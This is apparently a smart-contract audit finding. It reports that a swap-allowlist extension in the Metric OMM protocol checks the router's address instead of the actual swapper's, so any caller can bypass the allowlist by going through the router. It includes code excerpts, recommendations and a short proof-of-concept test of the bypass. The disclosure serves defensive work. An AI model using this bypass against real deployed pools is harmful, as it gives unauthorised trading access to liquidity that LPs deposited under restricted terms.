Audit Report

## Title
SwapAllowlistExtension Gates the Router Address Instead of the Actual Swapper, Allowing Any User to Bypass the Swap Allowlist - (File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol)

## Summary

`SwapAllowlistExtension.beforeSwap` checks the `sender` argument forwarded by the pool, which is the pool's own `msg.sender`. When a user routes through `MetricOmmSimpleRouter`, the router becomes the pool's `msg.sender`, so the allowlist checks whether the **router** is permitted rather than the actual user. Any pool admin who allowlists the router to enable router-mediated swaps inadvertently grants unrestricted swap access to every caller of the router, completely neutralising the access-control invariant the extension was deployed to enforce.

## Finding Description

`MetricOmmPool.swap` captures `msg.sender` and passes it as the first argument to `_beforeSwap`:

```solidity
// metric-core/contracts/MetricOmmPool.sol L230-240
_beforeSwap(
  msg.sender,   // ← pool's msg.sender, not the economic actor
  recipient,
  ...
);
```

`SwapAllowlistExtension.beforeSwap` receives that value as `sender` and checks it against the per-pool allowlist:

```solidity
// metric-periphery/contracts/extensions/SwapAllowlistExtension.sol L37
if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
```

`MetricOmmSimpleRouter.exactInputSingle` calls `pool.swap(...)` directly, making the router the pool's `msg.sender`:

```solidity
// metric-periphery/contracts/MetricOmmSimpleRouter.sol L72-80
(int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
  .swap(
    params.recipient,
    params.zeroForOne,
    ...
    params.extensionData
  );
```

The same pattern applies to `exactInput` (L104-112), `exactOutputSingle` (L136-137), and `exactOutput` (L165-181). In every case the router is the pool's `msg.sender`, so `sender` delivered to the extension is the router address, not the originating user.

Call chain:
```
user → router.exactInputSingle()
         → pool.swap()          [msg.sender = router]
             → _beforeSwap(sender = router, ...)
                 → SwapAllowlistExtension.beforeSwap(sender = router)
                     → allowedSwapper[pool][router]  ← checked, NOT the user
```

A pool admin who wants any allowlisted user to swap via the router must call `setAllowedToSwap(pool, router, true)`. Once that entry is set, `allowedSwapper[pool][router] == true` and the check passes for **every** caller of the router regardless of whether that caller is individually permitted. No existing guard in the extension or the router prevents this.

## Impact Explanation

A pool configured with `SwapAllowlistExtension` to restrict swapping to a curated set of addresses (e.g., KYC'd counterparties, institutional LPs, whitelisted market makers) loses that restriction entirely for any user who routes through `MetricOmmSimpleRouter`. Any unprivileged EOA or contract can execute swaps against the pool's liquidity, violating the access-control invariant the pool admin deployed the extension to enforce. Because swaps consume pool reserves and generate fee flows, unauthorized swap access constitutes broken core pool functionality with direct economic consequences for LPs who deposited under the assumption that only approved counterparties could trade. This meets the "Broken core pool functionality causing loss of funds or unusable swap flows" impact criterion.

## Likelihood Explanation

Likelihood is high. `MetricOmmSimpleRouter` is the canonical public entry point for swaps. A pool admin enabling router-mediated swaps for any allowlisted user must allowlist the router address; there is no other mechanism. Once the router is allowlisted, the bypass is unconditional and requires no special privileges, no flash loan, and no unusual token behaviour — any EOA or contract can call `exactInputSingle`.

## Recommendation

The extension must check the **economic actor**, not the intermediary. Viable approaches:

1. **Router-forwarded identity via `extensionData`**: The router encodes `msg.sender` into `extensionData` before calling the pool. The extension decodes and verifies that address against a registry of trusted routers. This keeps the extension stateless and the router accountable.
2. **Per-user allowlist enforced at the router**: The router checks the allowlist before forwarding to the pool, and the extension additionally verifies that the call came from a trusted router that has already performed the check.
3. At minimum, the `SwapAllowlistExtension` NatSpec and deployment documentation must warn that allowlisting the router grants unrestricted swap access to all router users.

## Proof of Concept

```solidity
// Setup
SwapAllowlistExtension ext = new SwapAllowlistExtension(factory);
// Pool deployed with ext as beforeSwap extension

// Admin allowlists the router so that permitted users can swap via it
vm.prank(poolAdmin);
ext.setAllowedToSwap(address(pool), address(router), true);

// Attacker — never individually allowlisted
address attacker = makeAddr("attacker");
deal(address(token0), attacker, 1_000e18);
vm.startPrank(attacker);
token0.approve(address(router), type(uint256).max);

// Attacker routes through the router; the allowlist checks allowedSwapper[pool][router] == true
// and passes — the attacker's address is never consulted
router.exactInputSingle(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool:             address(pool),
        recipient:        attacker,
        zeroForOne:       true,
        amountIn:         1_000e18,
        amountOutMinimum: 0,
        priceLimitX64:    0,
        deadline:         block.timestamp,
        tokenIn:          address(token0),
        extensionData:    ""
    })
);
// Swap succeeds — allowlist bypassed
vm.stopPrank();
```

The swap completes successfully. `SwapAllowlistExtension` never evaluated the attacker's address; it only confirmed that the router (the pool's `msg.sender`) was in the allowlist. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
